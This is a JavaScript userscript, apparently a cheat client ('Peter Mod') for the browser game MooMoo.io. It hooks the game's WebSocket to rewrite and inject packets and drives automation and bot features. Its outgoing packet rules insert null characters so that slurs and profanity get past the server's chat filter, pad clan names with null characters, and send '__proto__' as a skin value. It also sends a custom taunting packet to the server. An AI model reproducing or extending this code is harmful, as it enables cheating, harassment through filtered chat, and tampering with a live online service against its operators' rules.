    var storeButton = document.getElementById('storeButton');
    if (storeButton) {
        storeButton.style.right = '26px';
        storeButton.style.top = '420px';
    }
    if (allianceButton) {
        allianceButton.style.right = '26px';
        allianceButton.style.top = '479px';
    }
});

function getEl(id) {
    return document.getElementById(id);
}

!function(run) {

    let newFont = document.createElement("link");
    newFont.rel = "stylesheet";
    newFont.href = "https://fonts.googleapis.com/css?family=Ubuntu:700";
    newFont.type = "text/css";
    document.body.append(newFont);

    // The msgpack build this used to inject came from rawgit.com, offline
    // since 2019 -- window.msgpack was undefined and every encode/decode in
    // this file threw. The shim publishes a codec instead.
    window.oncontextmenu = function() {
        return false;
    };

    let config = window.config;

    // CLIENT:
    config.clientSendRate = 9; // Aim Packet Send Rate
    config.serverUpdateRate = 9;

    // UI:
    config.deathFadeout = 0;

    config.playerCapacity = 9999;

    // CHECK IN SANDBOX:
    config.isSandbox = window.location.hostname == "sandbox.moomoo.io";

    // CUSTOMIZATION:
    config.skinColors = ["#bf8f54", "#cbb091", "#896c4b",
                         "#fadadc", "#ececec", "#c37373", "#4c4c4c", "#ecaff7", "#738cc3",
                         "#8bc373", "#91b2db"
                        ];
    config.weaponVariants = [{
        id: 0,
        src: "",
        xp: 0,
        val: 1,
    }, {
        id: 1,
        src: "_g",
        xp: 3000,
        val: 1.1,
    }, {
        id: 2,
        src: "_d",
        xp: 7000,
        val: 1.18,
    }, {
        id: 3,
        src: "_r",
        poison: true,
        xp: 12000,
        val: 1.18,
    }, {
        id: 4,
        src: "_e",
        poison: true,
        heal: true,
        xp: 24000,
        val: 1.18,
    }];

    // VISUAL:
    config.anotherVisual = true;
    config.useWebGl = false;
    config.resetRender = true;

    function waitTime(timeout) {
        return new Promise((done) => {
            setTimeout(() => {
                done();
            }, timeout);
        });
    }

    let botSkts = [];

    // STORAGE:
    let canStore;
    if (typeof(Storage) !== "undefined") {
        canStore = true;
    }

    function saveVal(name, val) {
        if (canStore)
            localStorage.setItem(name, val);
    }

    function deleteVal(name) {
        if (canStore)
            localStorage.removeItem(name);
    }

    function getSavedVal(name) {
        if (canStore)
            return localStorage.getItem(name);
        return null;
    }

    // CONFIGS:
    let gC = function(a, b) {
        try {
            let res = JSON.parse(getSavedVal(a));
            if (typeof res === "object") {
                return b;
            } else {
                return res;
            }
        } catch (e) {
            alert("dieskid");
            return b;
        }
    };

    function setCommands() {
        return {
            "help": {
                desc: "Show Commands",
                action: function(message) {
                    for (let cmds in commands) {
                        addMenuChText("/" + cmds, commands[cmds].desc, "lime", 1);
                    }
                }
            },
            "clear": {
                desc: "Clear Chats",
                action: function(message) {
                    resetMenuChText();
                }
            },
            "debug": {
                desc: "Debug Mod For Development",
                action: function(message) {
                    addDeadPlayer(player);
                    addMenuChText("Debug", "Done", "#99ee99", 1);
                }
            },
            "play": {
                desc: "Play Music ( /play [link] )",
                action: function(message) {
                    let link = message.split(" ");
                    if (link[1]) {
                        let audio = new Audio(link[1]);
                        audio.play();
                    } else {
                        addMenuChText("Warn", "Enter Link ( /play [link] )", "#99ee99", 1);
                    }
                }
            },
            "bye": {
                desc: "Leave Game",
                action: function(message) {
                    window.leave();
                }
            },
        };
    }

    function setConfigs() {
        return {
            killChat: true,
            alwaysRev: true,
            autoBuy: true,
            autoBuyEquip: true,
            autoPush: true,
            revTick: true,
            spikeTick: true,
            predictTick: true,
            autoPlace: true,
            autoReplace: true,
            antiTrap: true,
            slowOT: false,
            attackDir: false,
            showDir: false,
            noDir: false,
            autoRespawn: false
        };
    };
    let commands = setCommands();
    let configs = setConfigs();
    window.removeConfigs = function() {
        for (let cF in configs) {
            deleteVal(cF, configs[cF]);
        }
    };

    for (let cF in configs) {
        configs[cF] = gC(cF, configs[cF]);
    }

    // MENU FUNCTIONS:
    window.changeMenu = function() {};
    window.debug = function() {};
    window.wasdMode = function() {};

    // PAGE 1:
    window.startGrind = function() {};

    // PAGE 3:
    window.connectFillBots = function() {};
    window.destroyFillBots = function() {};
    window.tryConnectBots = function() {};
    window.destroyBots = function() {};
    window.resBuild = function() {};
    window.toggleBotsCircle = function() {};
    window.toggleVisual = function() {};

    // SOME FUNCTIONS:
    window.prepareUI = function() {};
    window.leave = function() {};

    // nah hahahahahhh why good ping
    window.ping = 0;

    class deadfuturechickenmodrevival {
        constructor(flarez, lore) {
            this.inGame = false;
            this.lover = flarez + lore;
            this.baby = "ae86";
            this.isBlack = 0;
            this.webSocket = undefined;
            this.checkBaby = function() {
                this.baby !== "ae86" ? this.isBlack++ : this.isBlack--;
                if (this.isBlack >= 1) return "bl4cky";
                return "noting for you";
            };
            this.x2 = 0;
            this.y2 = 0;
            this.chat = "Imagine playing this badass game XDDDDD";
            this.summon = function(tmpObj) {
                this.x2 = tmpObj.x;
                this.y2 = tmpObj.y;
                this.chat = tmpObj.name + " ur so bad XDDDD";
            };
            this.commands = function(cmd) {
                cmd == "rv3link" && window.open("https://florr.io/");
                cmd == "woah" && window.open("https://www.youtube.com/watch?v=MO0AGukzj6M");
                return cmd;
            };
            this.dayte = "11yearold";
            this.memeganoob = "69yearold";
            this.startDayteSpawn = function(tmpObj) {
                let ratio = setInterval(() => {
                    this.x2 = tmpObj.x + 20;
                    this.y2 = tmpObj.y - 20;
                    this.chat = "UR SO BAD LOL";
                    if (tmpObj.name == "ae86") {
                        this.chat = "omg ae86 go run";
                        setTimeout(() => {
                            this.inGame = false;
                            clearInterval(ratio);
                        }, 1000);
                    }
                }, 1234);
            };
            this.AntiChickenModV69420 = function(tmpObj) {
                return "!c!dc user " + tmpObj.name;
            };
        }
    };
    class HtmlAction {
        constructor(element) {
            this.element = element;
        };
        add(code) {
            if (!this.element) return undefined;
            this.element.innerHTML += code;
        };
        newLine(amount) {
            let result = `<br>`;
            if (amount > 0) {
                result = ``;
                for (let i = 0; i < amount; i++) {
                    result += `<br>`;
                }
            }
            this.add(result);
        };
        checkBox(setting) {
            let newCheck = `<input type = "checkbox"`;
            setting.id && (newCheck += ` id = ${setting.id}`);
            setting.style && (newCheck += ` style = ${setting.style.replaceAll(" ", "")}`);
            setting.class && (newCheck += ` class = ${setting.class}`);
            setting.checked && (newCheck += ` checked`);
            setting.onclick && (newCheck += ` onclick = ${setting.onclick}`);
            newCheck += `>`;
            this.add(newCheck);
        };
        text(setting) {
            let newText = `<input type = "text"`;
            setting.id && (newText += ` id = ${setting.id}`);
            setting.style && (newText += ` style = ${setting.style.replaceAll(" ", "")}`);
            setting.class && (newText += ` class = ${setting.class}`);
            setting.size && (newText += ` size = ${setting.size}`);
            setting.maxLength && (newText += ` maxLength = ${setting.maxLength}`);
            setting.value && (newText += ` value = ${setting.value}`);
            setting.placeHolder && (newText += ` placeHolder = ${setting.placeHolder.replaceAll(" ", "&nbsp;")}`);
            newText += `>`;
            this.add(newText);
        };
        select(setting) {
            let newSelect = `<select`;
            setting.id && (newSelect += ` id = ${setting.id}`);
            setting.style && (newSelect += ` style = ${setting.style.replaceAll(" ", "")}`);
            setting.class && (newSelect += ` class = ${setting.class}`);
            newSelect += `>`;
            for (let options in setting.option) {
                newSelect += `<option value = ${setting.option[options].id}`
                setting.option[options].selected && (newSelect += ` selected`);
                newSelect += `>${options}</option>`;
            }
            newSelect += `</select>`;
            this.add(newSelect);
        };
        button(setting) {
            let newButton = `<button`;
            setting.id && (newButton += ` id = ${setting.id}`);
            setting.style && (newButton += ` style = ${setting.style.replaceAll(" ", "")}`);
            setting.class && (newButton += ` class = ${setting.class}`);
            setting.onclick && (newButton += ` onclick = ${setting.onclick}`);
            newButton += `>`;
            setting.innerHTML && (newButton += setting.innerHTML);
            newButton += `</button>`;
            this.add(newButton);
        };
        selectMenu(setting) {
            let newSelect = `<select`;
            if (!setting.id) {
                alert("please put id skid");
                return;
            }
            window[setting.id + "Func"] = function() {};
            setting.id && (newSelect += ` id = ${setting.id}`);
            setting.style && (newSelect += ` style = ${setting.style.replaceAll(" ", "")}`);
            setting.class && (newSelect += ` class = ${setting.class}`);
            newSelect += ` onchange = window.${setting.id + "Func"}()`;
            newSelect += `>`;
            let last;
            let i = 0;
            for (let options in setting.menu) {
                newSelect += `<option value = ${"option_" + options} id = ${"O_" + options}`;
                setting.menu[options] && (newSelect += ` checked`);
                newSelect += ` style = "color: ${setting.menu[options] ? "#000" : "#fff"}; background: ${setting.menu[options] ? "#8ecc51" : "#cc5151"};">${options}</option>`;
                i++;
            }
            newSelect += `</select>`;

            this.add(newSelect);

            i = 0;
            for (let options in setting.menu) {
                window[options + "Func"] = function() {
                    setting.menu[options] = getEl("check_" + options).checked ? true : false;
                    saveVal(options, setting.menu[options]);

                    getEl("O_" + options).style.color = setting.menu[options] ? "#000" : "#fff";
                    getEl("O_" + options).style.background = setting.menu[options] ? "#8ecc51" : "#cc5151";

                    //getEl(setting.id).style.color = setting.menu[options] ? "#8ecc51" : "#cc5151";

                };
                this.checkBox({
                    id: "check_" + options,
                    style: `display: ${i == 0 ? "inline-block" : "none"};`,
                    class: "checkB",
                    onclick: `window.${options + "Func"}()`,
                    checked: setting.menu[options]
                });
                i++;
            }

            last = "check_" + getEl(setting.id).value.split("_")[1];
            window[setting.id + "Func"] = function() {
                getEl(last).style.display = "none";
                last = "check_" + getEl(setting.id).value.split("_")[1];
                getEl(last).style.display = "inline-block";

                //getEl(setting.id).style.color = setting.menu[last.split("_")[1]] ? "#8ecc51" : "#fff";

            };
        };
    };
    class Html {
        constructor() {
            this.element = null;
            this.action = null;
            this.divElement = null;
            this.startDiv = function(setting, func) {

                let newDiv = document.createElement("div");
                setting.id && (newDiv.id = setting.id);
                setting.style && (newDiv.style = setting.style);
                setting.class && (newDiv.className = setting.class);
                this.element.appendChild(newDiv);
                this.divElement = newDiv;

                let addRes = new HtmlAction(newDiv);
                typeof func == "function" && func(addRes);

            };
            this.addDiv = function(setting, func) {

                let newDiv = document.createElement("div");
                setting.id && (newDiv.id = setting.id);
                setting.style && (newDiv.style = setting.style);
                setting.class && (newDiv.className = setting.class);
                setting.appendID && getEl(setting.appendID).appendChild(newDiv);
                this.divElement = newDiv;

                let addRes = new HtmlAction(newDiv);
                typeof func == "function" && func(addRes);

            };
        };
        set(id) {
            this.element = getEl(id);
            this.action = new HtmlAction(this.element);
        };
        resetHTML(text) {
            if (text) {
                this.element.innerHTML = ``;
            } else {
                this.element.innerHTML = ``;
            }
        };
        setStyle(style) {
            this.element.style = style;
        };
        setCSS(style) {
            this.action.add(`<style>` + style + `</style>`);
        };
    };

    let HTML = new Html();

    let menuDiv = document.createElement("div");
    menuDiv.id = "menuDiv";
    document.body.appendChild(menuDiv);
    HTML.set("menuDiv");
    HTML.setStyle(`
    position: absolute;
    left: 20px;
    top: 20px;
`);
    HTML.resetHTML();
    HTML.setCSS(`
    .menuClass {
        color: #8a2658;
        background-image: url('');
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        font-size: 48px;
        text-align: center;
        padding: 28px;
        max-height: 198px;
        width: 350px;
        background-color: #feffbb;
        border-radius: 175px;
        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
        transition: opacity 0.4s ease-in-out, transform 0.4s ease-in-out, box-shadow 0.3s ease-in-out, filter 0.4s ease-in-out, border-color 0.3s ease-in-out;
        overflow: auto;
        filter: none;
        border: 2px solid transparent; /* Add a border */
    }
    .menuClass:hover {
        border-color: rgb(255,255,255); /* Change border color on hover to RGB red */
    }
    .menuClass:hover .menuContent {
        background-color: #8a2658; /* Change background color of menu content to darker black on hover */
    }
    .menuContent {
        color: #fff;
    }
    .menuC {
        display: none;
        font-family: "Hammersmith One", sans-serif;
        font-size: 14px;
        max-height: 200px;
        overflow-y: auto;
    }
    .menuB {
        text-align: center;
        background-color: #feffbb;
        color: #3412a1;
        border-radius: 25px;
        border: 2px solid transparent;
        cursor: pointer;
        overflow-y: auto;
        transition: border-color 0.3s ease-in-out;
    }
    .menuB:hover {
        border-color: #fd1d0d;
    }
    .menuB:active {
        color: #fd1d0d;
        background-color: #2cd62c;
    }
    .customText {
        color: #000;
        border-radius: 25px;
        border: 2px solid #000;
        padding: 4px;
        transition: background-color 0.3s ease-in-out;
    }
    .customText:focus {
        background-color: rgba(30, 130, 76, 0.3);
    }
    .checkB {
        position: relative;
        top: 2px;
        accent-color: #0b5394;
        cursor: pointer;
    }
    .Cselect {
        border-radius: 25px;
        background-color: #2cd6d6;
        color: #ff0000;
        border: 1px solid #8fce00;
    }
    #menuChanger {
        position: absolute;
        right: 50px;
        top: 50px;
        background-color: rgba(0, 0, 0, 0);
        color: #ea9999;
        border: none;
        cursor: pointer;
        transition: color 0.3s ease-in-out;
    }
    #menuChanger:hover {
        color: #000;
    }

    ::-webkit-scrollbar {
        width: 0; /* Skryje vertikální scrollbar na WebKit prohlížečích */
    }
`);

    HTML.startDiv({
        id: "menuHeadLine",
        class: "menuClass"
    }, (html) => {
        html.add(`Peter Mod 11v`);
        html.button({
            id: "menuChanger",
            class: "material-icons",
            innerHTML: `sync`,
            onclick: "window.changeMenu()"
        });
        HTML.addDiv({
            id: "menuButtons",
            style: "display: block; overflow-y: visible;",
            class: "menuC",
            appendID: "menuHeadLine"
        }, (html) => {
            html.button({
                class: "menuB",
                innerHTML: ">Debug<",
                onclick: "window.debug()"
            });
        });
        HTML.addDiv({
            id: "menuMain",
            style: "display: block",
            class: "menuC",
            appendID: "menuHeadLine"
        }, (html) => {
            html.button({
                class: "menuB",
                innerHTML: ">ModTryHard<",
                onclick: "window.wasdMode()"
            });
            html.newLine();
            html.add(`AutoFarm:`);
            html.checkBox({
                id: "weaponGrind",
                class: "checkB",
                onclick: "window.startGrind()"
            });
            html.newLine(2);
            HTML.addDiv({
                style: "font-size: 20px; color: #99ee99;",
                appendID: "menuMain"
            }, (html) => {
                html.add(`Devolp:`);
            });
            html.add(`Push v2:`);
            html.checkBox({
                id: "antipush",
                class: "checkB",
                checked: true
            });
            html.newLine();
            html.add(`Anti-Clown:`);
            html.checkBox({
                id: "healingBeta",
                class: "checkB",
                checked: true
            });
            html.newLine();
        });
        HTML.addDiv({
            id: "menuConfig",
            class: "menuC",
            appendID: "menuHeadLine"
        }, (html) => {
            html.add(`Placement Tick: `);
            html.text({
                id: "autoPlaceTick",
                class: "customText",
                value: "2",
                size: "2em",
                maxLength: "1"
            });
            html.newLine();
            html.add(`Options: `);
            html.selectMenu({
                id: "configsChanger",
                class: "Cselect",
                menu: configs
            });
            html.newLine();
            html.add(`AntiBull: `);
            html.select({
                id: "antiBullType",
                class: "Cselect",
                option: {
                    "Disable": {
                        id: "noab",
                        selected: true,
                    },
                    "When Reloaded": {
                        id: "abreload",
                    },
                    "Always": {
                        id: "abalway",
                    }
                }
            });
        });
        HTML.addDiv({
            id: "menuOther",
            class: "menuC",
            appendID: "menuHeadLine"
        }, (html) => {
            html.button({
                class: "menuB",
                innerHTML: ">Connect Bots<",
                onclick: "window.tryConnectBots()"
            });
            html.button({
                class: "menuB",
                innerHTML: ">Disconnect Bots<",
                onclick: "window.destroyBots()"
            });
            html.newLine();
            html.add(`Break Objects Range: `);
            html.text({
                id: "breakRange",
                class: "customText",
                value: "700",
                size: "3em",
                maxLength: "4"
            });
            html.newLine();
            html.add(`Render Movement: `);
            html.select({
                id: "predictType",
                class: "Cselect",
                option: {
                    "Disable Render": {
                        id: "disableRender",
                        selected: true
                    },
                    "X/Y and 2": {
                        id: "pre2",
                    },
                    "X/Y and 3": {
                        id: "pre3"
                    }
                }
            });
            html.newLine();
            html.add(`Render Placers: `);
            html.checkBox({
                id: "placeVis",
                class: "checkB",
            });
            html.newLine();
            html.add(`Bot Mode: `);
            html.select({
                id: "mode",
                class: "Cselect",
                option: {
                    "Clear Building": {
                        id: "clear",
                        selected: true
                    },
                    "Sync": {
                        id: "zync",
                    },
                    "Search": {
                        id: "zearch"
                    },
                    "Clear Everything": {
                        id: "fuckemup"
                    },
                    "Flex": {
                        id: "flex"
                    }
                }
            });
            html.newLine();
            html.add(`Bot Setup: `);
            html.select({
                id: "setup",
                class: "Cselect",
                option: {
                    "Dagger Musket": {
                        id: "dm",
                        selected: true
                    },
                    "Katana Hammer": {
                        id: "kh",
                    },
                    "Dagger Repeater-Crossbow": {
                        id: "dr"
                    },
                    "Sword Muzket": {
                        id: "zd"
                    }
                }
            });
            html.newLine();
            html.button({
                class: "menuB",
                innerHTML: ">ModTryHard<",
                onclick: "window.toggleVisual()"
            });
            html.newLine();
        });
    });
    function toFancyTimeFormat(time) {
        let minutes = ~~((time % 3600) / 60);
        let seconds = ~~time % 60;
        if (seconds <= 9) seconds = `0${seconds}`;
        return `${minutes}:${seconds}`;
    }
    const songchat1 = new Audio("https://cdn.discordapp.com/attachments/1175772907931176991/1227645695796969492/Benzz_-_Je_Mappelle_Music_Video_GRM_Daily.mp3?ex=662fc0a6&is=662e6f26&hm=0b1c67270ba28a0298c01b1a3435bcc5e4aac496053bc3e9a73689cef70870bf&");
    let isPlaying = false;
    let currentPart = '';
    function toggleSong() {
        if (!isPlaying) {
            songchat1.play();
            songchat1.ontimeupdate = function(time) {
                let part = song[toFancyTimeFormat(Math.round(this.currentTime | 0))];
                if (part && part !== currentPart) {
                    currentPart = part;
                    io.send("6", part);
                }
            };
            songchat1.onended = function() {
                if (isPlaying) {
                    songchat1.play();
                }
            };
            isPlaying = true;
        } else {
            songchat1.pause();
            isPlaying = false;
        }
    }
    document.addEventListener("keypress", function(e) {
        if (e.key === "C") {
            toggleSong();
        }
    });
    let menuChatDiv = document.createElement("div");
    menuChatDiv.id = "menuChatDiv";
    document.body.appendChild(menuChatDiv);
    HTML.set("menuChatDiv");
    HTML.setStyle(`
            position: absolute;
            display: none;
            left: 0px;
            top: 25px;
          //  box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.65);
            `);
    HTML.resetHTML();
    HTML.setCSS(`
                    .chDiv {
    color: #fff;
    padding: 10px;
    width: 357px;
    height: 217px;
    background-color: rgba(0, 0, 0, 0.2);
    font-family: "HammerSmith One", monospace;
 //   border-radius: 15px;
//    box-shadow: black 1px 2px 19px;
//backdrop-filter: blur(3px);

}
.chMainDiv {
    font-family: "Ubuntu";
    font-size: 16px;
    max-height: 215px;
    overflow-y: scroll;
    scrollbar-width: thin;
    scrollbar-color: rgba(0, 0, 0, 0.5) rgba(0, 0, 0, 0.1);
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    overflow-x: hidden;
}
.chMainDiv::-webkit-scrollbar {
    width: 8px;
}
.chMainDiv::-webkit-scrollbar-thumb {
    background-color: rgba(0, 0, 0, 0.5);
}
.chMainDiv::-webkit-scrollbar-thumb:hover {
    background-color: rgba(0, 0, 0, 0.7);
}
.chMainBox {
display:none;
     position: absolute;
    left: 10px;
    bottom: 10px;
    width: 380px;
    height: 25px;
    background-color: rgba(255, 255, 255, 0.1);
    border-radius: 5px;
    color: rgba(255, 255, 255, 0.75);
    font-family: "HammerSmith One";
    font-size: 12px;
}
            `);
    HTML.startDiv({
        id: "mChDiv",
        class: "chDiv"
    }, (html) => {
        HTML.addDiv({
            id: "mChMain",
            class: "chMainDiv",
            appendID: "mChDiv"
        }, (html) => {});
        html.text({
            id: "mChBox",
            class: "chMainBox",
            //  placeHolder: `To chat click here or press "Enter" key`
        });
    });

    let menuChats = getEl("mChMain");
    let menuChatBox = getEl("mChBox");
    let menuCBFocus = false;
    let menuChCounts = 0;

    menuChatBox.value = "";
    menuChatBox.addEventListener("focus", () => {
        menuCBFocus = true;
    });
    menuChatBox.addEventListener("blur", () => {
        menuCBFocus = false;
    });

    function addMenuChText(name, message, color, noTimer) {
        HTML.set("menuChatDiv");
        color = color || "white";
        let time = new Date();
        let min = time.getMinutes();
        let hour = time.getHours();
        let text = ``;
        if (!noTimer) text += `${(hour < 10 ? '0' : '') + hour}:${(min < 10 ? '0' : '') + min}`;
        if (name) text += `${(!noTimer ? " - " : "") + name}`;
        if (message) text += `${(name ? ": " : !noTimer ? " - " : "") + message}\n`;
        HTML.addDiv({ id: "menuChDisp", style: `color: ${color}`, appendID: "mChMain" }, (html) => {
            html.add(text);
        });
        menuChats.scrollTop = menuChats.scrollHeight;
        menuChCounts++;
    }
    function chch(name, message, color, noTimer) {
        HTML.set("menuChatDiv");
        color = color || "white";
        let time = new Date();
        let text = ``;
        // if (name) text += `${(!noTimer ? " - " : "") + name}`;
        if (message) text += `${(name ? ": " : !noTimer ? "" : "") + message}\n`;
        HTML.addDiv({ id: "menuChDisp", style: `color: ${color}`, appendID: "mChMain" }, (html) => {
            html.add(text);
        });
        menuChats.scrollTop = menuChats.scrollHeight;
        menuChCounts++;
    }

    function resetMenuChText() {
        menuChats.innerHTML = ``;
        menuChCounts = 0;
        addMenuChText(null, "Chat '/help' for a list of chat commands.", "white", 1)
    }
    resetMenuChText();

    let menuIndex = 0;
    let menus = ["menuMain", "menuConfig", "menuOther"];
    window.changeMenu = function() {
        getEl(menus[menuIndex % menus.length]).style.display = "none";
        menuIndex++;
        getEl(menus[menuIndex % menus.length]).style.display = "block";
    };

    let mStatus = document.createElement("div");
    mStatus.id = "status";
    getEl("gameUI").appendChild(mStatus);
    HTML.set("status");
    HTML.setStyle(`
            display: block;
            position: absolute;
            color: #000000;
            font: 15px HammerSmith One;
            bottom: 215px;
            left: 20px;
            `);
    HTML.resetHTML();
    HTML.setCSS(`
            .sizing {
                font-size: 15px;
            }
            .mod {
                font-size: 15px;
                display: inline-block;
            }
            `);
    HTML.startDiv({
        id: "uehmod",
        class: "sizing"
    }, (html) => {
        html.add(`Ping: `);
        HTML.addDiv({
            id: "pingFps",
            class: "mod",
            appendID: "uehmod"
        }, (html) => {
            html.add("None");
        });
        html.newLine();
        html.add(`Packet: `);
        HTML.addDiv({
            id: "packetStatus",
            class: "mod",
            appendID: "uehmod"
        }, (html) => {
            html.add("None");
        });
    });

    /*function modLog() {
                let logs = [];
                for (let i = 0; i < arguments.length; i++) {
                    logs.push(arguments[i]);
                }
                getEl("modLog").innerHTML = logs;
            }*/

    let openMenu = false;

    let WS = undefined;
    let socketID = undefined;

    let useWasd = false;
    let secPacket = 0;
    let secMax = 120;
    let secTime = 1000;
    let firstSend = {
        sec: false
    };
    let game = {
        tick: 0,
        tickQueue: [],
        tickBase: function(set, tick) {
            if (this.tickQueue[this.tick + tick]) {
                this.tickQueue[this.tick + tick].push(set);
            } else {
                this.tickQueue[this.tick + tick] = [set];
            }
        },
        tickRate: (1000 / config.serverUpdateRate),
        tickSpeed: 0,
        lastTick: performance.now()
    };
    let modConsole = [];

    let dontSend = false;
    let fpsTimer = {
        last: 0,
        time: 0,
        ltime: 0
    }
    let lastMoveDir = undefined;
    let lastsp = ["cc", 1, "__proto__"];

    // Registered with the shim installed at document-start, which already owns
    // WebSocket.prototype.send (the game captured that reference at load).
    EXP.setHandler(function(message) {
        if (!WS) {
            WS = this;
            WS.addEventListener("message", function(msg) {
                getMessage(msg);
            });
            WS.addEventListener("close", (event) => {
                if (event.code == 4001) {
                    window.location.reload();
                }
            });
        }
        if (WS == this) {
            // Unframe: strips the MAC and turns the numeric opcode back into
            // the string name the rest of this client is written against.
            const unframed = EXP.unframe(this, message);
            if (!unframed) return EXP.nativeSend.call(this, message);

            const outgoing = applyOutgoing(unframed.type, unframed.args);
            if (outgoing) {
                EXP.send(this, outgoing.type, outgoing.data);

                // START COUNT:
                if (!firstSend.sec) {
                    firstSend.sec = true;
                    setTimeout(() => {
                        firstSend.sec = false;
                        secPacket = 0;
                    }, secTime);
                }

                secPacket++;
            }
        } else {
            EXP.nativeSend.call(this, message);
        }
    });

    // The client's outgoing packet rules. Mutates `data` in place; returns
    // false to drop the packet. Shared by the socket hook and by packet(), so
    // injected packets get exactly the same treatment as the game's own.
    function applyOutgoing(type, data) {
            dontSend = false;

            // This client was written against a build that called some packets
            // by older names -- notably the move packet, which it still emits
            // as "f" from packet() while the game now sends "9". Fold both onto
            // the current name through the shim's own table so one rule covers
            // them. EXP.send() applies the same map, and it is idempotent.
            if (Object.prototype.hasOwnProperty.call(EXP.PACKET_MAP, type)) type = EXP.PACKET_MAP[type];

            // SEND MESSAGE:
            if (type == "6") {

                if (data[0]) {
                    // ANTI PROFANITY:
                    let profanity = ["cunt", "whore", "fuck", "shit", "faggot", "nigger", "nigga", "dick", "vagina", "minge", "cock", "rape", "cum", "sex", "tits", "penis", "clit", "pussy", "meatcurtain", "jizz", "prune", "douche", "wanker", "damn", "bitch", "dick", "fag", "bastard", ];
                    let tmpString;
                    profanity.forEach((profany) => {
                        if (data[0].indexOf(profany) > -1) {
                            tmpString = "";
                            for (let i = 0; i < profany.length; ++i) {
                                if (i == 1) {
                                    tmpString += String.fromCharCode(0);
                                }
                                tmpString += profany[i];
                            }
                            let re = new RegExp(profany, "g");
                            data[0] = data[0].replace(re, tmpString);
                        }
                    });

                    // FIX CHAT:
                    data[0] = data[0].slice(0, 30);
                }

            } else if (type == "L") {
                // MAKE SAME CLAN:
                data[0] = data[0] + (String.fromCharCode(0).repeat(7));
                data[0] = data[0].slice(0, 7);
            } else if (type == "M") {
                // APPLY CYAN COLOR:
                data[0].name = data[0].name == "" ? "unknown" : data[0].name;
                data[0].moofoll = true;
                data[0].skin = data[0].skin == 10 ? "__proto__" : data[0].skin;
                lastsp = [data[0].name, data[0].moofoll, data[0].skin];
            } else if (type == "D") {
                if ((my.lastDir == data[0]) || [null, undefined].includes(data[0])) {
                    dontSend = true;
                } else {
                    my.lastDir = data[0];
                }
            } else if (type == "F") {
                if (!data[2]) {
                    dontSend = true;
                } else {
                    if (![null, undefined].includes(data[1])) {
                        my.lastDir = data[1];
                    }
                }
            } else if (type == "K") {
                if (!data[1]) {
                    dontSend = true;
                }
            } else if (type == "S") {
                instaC.wait = !instaC.wait;
                dontSend = true;
            } else if (type == "9") {
                if (data[1]) {
                    if (player.moveDir == data[0]) {
                        dontSend = true;
                    }
                    player.moveDir = data[0];
                } else {
                    dontSend = true;
                }
            }
            return dontSend ? false : { type: type, data: data };
    }

    function packet(type) {
        // EXTRACT DATA ARRAY:
        let data = Array.prototype.slice.call(arguments, 1);

        // Runs the same outgoing rules as the game's own packets, then frames.
        const outgoing = applyOutgoing(type, data);
        if (outgoing) EXP.send(WS, outgoing.type, outgoing.data);
    }

    function origPacket(type) {
        // EXTRACT DATA ARRAY:
        let data = Array.prototype.slice.call(arguments, 1);

        // Deliberately skips applyOutgoing -- that is what this one is for --
        // but it still has to be framed, so it cannot use the raw native send
        // the way it used to.
        EXP.send(WS, type, data);
    }

    window.leave = function() {
        origPacket("kys", {
            "frvr is so bad": true,
            "sidney is too good": true,
            "dev are too weak": true,
        });
    };

    //...lol
    let io = {
        send: packet
    };

    function getMessage(message) {
        // Maps the numeric opcode back to the string name this client uses.
        let parsed = EXP.receive(message.target || WS, message.data);
        if (!parsed) return;
        let type = parsed.type;
        let data = parsed.args;
        let events = {
            A: setInitData, // id: setInitData,
            //B: disconnect,
            C: setupGame, // 1: setupGame,
            D: addPlayer, // 2: addPlayer,
            E: removePlayer, // 4: removePlayer,
            a: updatePlayers, // 33: updatePlayers,
            G: updateLeaderboard, // 5: updateLeaderboard,here
            H: loadGameObject, // 6: loadGameObject,
            I: loadAI, // a: loadAI,
            J: animateAI, // aa: animateAI,
            K: gatherAnimation, // 7: gatherAnimation,
            L: wiggleGameObject, // 8: wiggleGameObject,
            M: shootTurret, // sp: shootTurret,
            N: updatePlayerValue, // 9: updatePlayerValue,
            O: updateHealth, // h: updateHealth,//here
            P: killPlayer, // 11: killPlayer,
            Q: killObject, // 12: killObject,
            R: killObjects, // 13: killObjects,
            S: updateItemCounts, // 14: updateItemCounts,
            T: updateAge, // 15: updateAge,
            U: updateUpgrades, // 16: updateUpgrades,
            V: updateItems, // 17: updateItems,
            X: addProjectile, // 18: addProjectile,
            Y: remProjectile, // 19: remProjectile,
            //Z: serverShutdownNotice,
            //0: addAlliance,
            //1: deleteAlliance,
            2: allianceNotification, // an: allianceNotification,
            3: setPlayerTeam, // st: setPlayerTeam,
            4: setAlliancePlayers, // sa: setAlliancePlayers,
            5: updateStoreItems, // us: updateStoreItems,
            6: receiveChat, // ch: receiveChat,
            7: updateMinimap, // mm: updateMinimap,
            8: showText, // t: showText,
            9: pingMap, // p: pingMap,
            0: pingSocketResponse,
        };
        if (type == "io-init") {
            socketID = data[0];
        } else {
            if (events[type]) {
                events[type].apply(undefined, data);
            }
        }
    }

    // MATHS:
    Math.lerpAngle = function(value1, value2, amount) {
        let difference = Math.abs(value2 - value1);
        if (difference > Math.PI) {
            if (value1 > value2) {
                value2 += Math.PI * 2;
            } else {
                value1 += Math.PI * 2;
            }
        }
        let value = value2 + ((value1 - value2) * amount);
        if (value >= 0 && value <= Math.PI * 2) return value;
        return value % (Math.PI * 2);
    };

    // REOUNDED RECTANGLE:
    CanvasRenderingContext2D.prototype.roundRect = function(x, y, w, h, r) {
        if (w < 2 * r) r = w / 2;
        if (h < 2 * r) r = h / 2;
        if (r < 0)
            r = 0;
        this.beginPath();
        this.moveTo(x + r, y);
        this.arcTo(x + w, y, x + w, y + h, r);
        this.arcTo(x + w, y + h, x, y + h, r);
        this.arcTo(x, y + h, x, y, r);
        this.arcTo(x, y, x + w, y, r);
        this.closePath();
        return this;
    };

    // GLOBAL VALUES:
    function resetMoveDir() {
        keys = {};
        io.send("e");
    }

    let allChats = [];
    let ticks = {
        tick: 0,
        delay: 0,
        time: [],
        manage: [],
    };
    let ais = [];
    let players = [];
    let alliances = [];
    let alliancePlayers = [];
    let allianceNotifications = [];
    let gameObjects = [];
    let liztobj = [];
    let projectiles = [];
    let deadPlayers = [];

    let breakObjects = [];

    let player;
    let playerSID;
    let tmpObj;

    let enemy = [];
    let nears = [];
    let near = [];

